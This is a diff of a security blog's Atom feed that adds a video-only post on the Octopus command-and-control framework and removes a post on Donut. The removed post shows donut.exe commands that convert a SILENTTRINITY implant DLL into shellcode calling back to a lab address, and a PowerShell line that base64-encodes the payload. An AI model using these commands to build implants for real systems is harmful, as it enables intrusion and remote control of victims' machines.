@@ -67,6 +67,24 @@
   </entry>
   
   <entry>
+    <title>octopus</title>
+    <link href="www.ggsec.cn/octopus.html"/>
+    <id>www.ggsec.cn/octopus.html</id>
+    <published>2019-12-22T02:09:22.000Z</published>
+    <updated>2019-12-22T02:15:53.976Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F0457EBCBD5497B7AF66E0B42EFCF350.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/octopus.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p>参考资料 ： <a href="https://github.com/mhaskar/Octopus" target="_blank" rel="noopener">https://github.com/mhaskar/Octopus</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/F0457EBCBD5497B7AF66E0B42EFCF350.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>office_sylk_mac</title>
     <link href="www.ggsec.cn/office-sylk-mac.html"/>
     <id>www.ggsec.cn/office-sylk-mac.html</id>
@@ -421,28 +439,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>donut</title>
-    <link href="www.ggsec.cn/donut.html"/>
-    <id>www.ggsec.cn/donut.html</id>
-    <published>2019-05-13T11:17:01.000Z</published>
-    <updated>2019-05-13T11:26:05.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190513_190748.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/donut.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><a href="https://thewover.github.io/Introducing-Donut/" target="_blank" rel="noopener">https://thewover.github.io/Introducing-Donut/</a><br><a href="https://github.com/TheWover/donut/" target="_blank" rel="noopener">https://github.com/TheWover/donut/</a><br><a href="https://github.com/TheWover/donut/releases/tag/v0.9" target="_blank" rel="noopener">https://github.com/TheWover/donut/releases/tag/v0.9</a><br><a href="https://github.com/byt3bl33d3r/SILENTTRINITY" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/SILENTTRINITY</a><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> .\donut<span class="selector-class">.exe</span> -<span class="selector-tag">a</span> <span class="number">1</span> -f .\SILENTTRINITY_DLL<span class="selector-class">.dll</span> -c ST -m Main -<span class="selector-tag">p</span> http:<span class="comment">//192.168.10.125:80</span></span><br><span class="line"> .\donut<span class="selector-class">.exe</span> -<span class="selector-tag">a</span> <span class="number">2</span> -f .\SILENTTRINITY_DLL<span class="selector-class">.dll</span> -c ST -m Main -<span class="selector-tag">p</span> http:<span class="comment">//192.168.10.125:80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span>=<span class="string">"C:\Users\demon\Desktop\payload.bin"</span></span><br><span class="line">[convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip</span><br></pre></td></tr></table></figure></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD15D3B049938642D012504E1A16285C.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/67C730933F6BBBF12572A4E54BE29EC5.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1E2238E15A7540C565774F279974CEAC.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/C86DC2516ABBF56F8D18036A1B438515.jpg" alt="enter description here"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190513_190748.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
-    
-    
-      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
     
   </entry>
   
